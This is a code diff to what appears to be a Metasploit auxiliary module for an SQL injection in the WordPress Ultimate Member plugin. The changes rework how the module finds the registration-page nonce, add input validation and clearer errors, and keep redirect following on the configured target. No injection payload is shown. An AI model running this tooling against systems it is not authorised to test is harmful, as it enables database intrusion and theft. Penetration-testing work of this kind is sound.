@@ -8,6 +8,8 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
 
+  NONCE_REDIRECT_LIMIT = 3
+
   def initialize(info = {})
     super(
       update_info(
@@ -52,16 +54,22 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_nonce
+    if datastore['PAGE_ID_MIN'] > datastore['PAGE_ID_MAX']
+      fail_with(Failure::BadConfig, 'PAGE_ID_MIN must not exceed PAGE_ID_MAX')
+    end
+
     print_status('Attempting to locate the registration page and retrieve the nonce...')
 
-    uris_to_test = (datastore['PAGE_ID_MIN']..datastore['PAGE_ID_MAX']).map { |id| "?page_id=#{id}" }
+    received_response = false
 
-    uris_to_test.each do |uri|
-      res = send_request_cgi({
+    (datastore['PAGE_ID_MIN']..datastore['PAGE_ID_MAX']).each do |page_id|
+      res = nonce_page_response({
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, uri)
+        'uri' => normalize_uri(target_uri.path),
+        'vars_get' => { 'page_id' => page_id }
       })
 
+      received_response ||= !res.nil?
       next unless res&.code && res.code <= 500
 
       page = res.get_html_document
@@ -70,14 +78,17 @@ class MetasploitModule < Msf::Auxiliary
       next unless script_tag
 
       nonce = script_tag.text[/"nonce":"([^"]+)"/, 1]
-      if nonce
-        print_good("Nonce retrieved: #{nonce} using #{uri}")
+      if nonce && !nonce.strip.empty?
+        print_good("Nonce retrieved: #{nonce} using ?page_id=#{page_id}")
         return nonce
       end
     end
 
-    print_error('Failed to retrieve nonce')
-    raise 'Failed to retrieve nonce'
+    unless received_response
+      fail_with(Failure::Unreachable, 'Target did not respond while retrieving an Ultimate Member nonce')
+    end
+
+    fail_with(Failure::NotFound, 'Failed to retrieve an Ultimate Member nonce within the configured page range')
   end
 
   def get_directory_id(nonce)
@@ -144,5 +155,38 @@ class MetasploitModule < Msf::Auxiliary
     else
       fail_with(Failure::NotFound, 'Failed to retrieve nonce or directory_id')
     end
+  end
+
+  private
+
+  def nonce_page_response(request)
+    origin = http_redirect_origin_from_options(request)
+    connection = http_redirect_connection_options(request)
+    res = send_request_cgi(request)
+
+    NONCE_REDIRECT_LIMIT.times do
+      break unless res&.redirect? && res.redirection
+
+      destination = http_redirect_target_origin(res.redirection, origin)
+      allowed_hosts = [origin[:host], rhost.to_s.downcase]
+      allowed_ports = [origin[:port], ssl ? 443 : 80]
+      unless !destination[:credentials] && destination[:scheme] == origin[:scheme] && allowed_hosts.include?(destination[:host]) && allowed_ports.include?(destination[:port])
+        vprint_status('Not following the nonce page redirect outside the configured target')
+        return res
+      end
+
+      # WordPress can canonicalize a virtual host to its public/default port.
+      # Reuse the redirect normalizer while retaining the operator's endpoint.
+      reconfig_redirect_opts!(res, request, preserve_connection: true, connection_options: connection)
+      res = send_request_cgi(request)
+    end
+
+    res
+  rescue Rex::ConnectionError => e
+    elog('Failed to retrieve an Ultimate Member nonce page', error: e)
+    nil
+  rescue URI::Error => e
+    elog('Invalid Ultimate Member nonce page redirect', error: e)
+    res
   end
 end
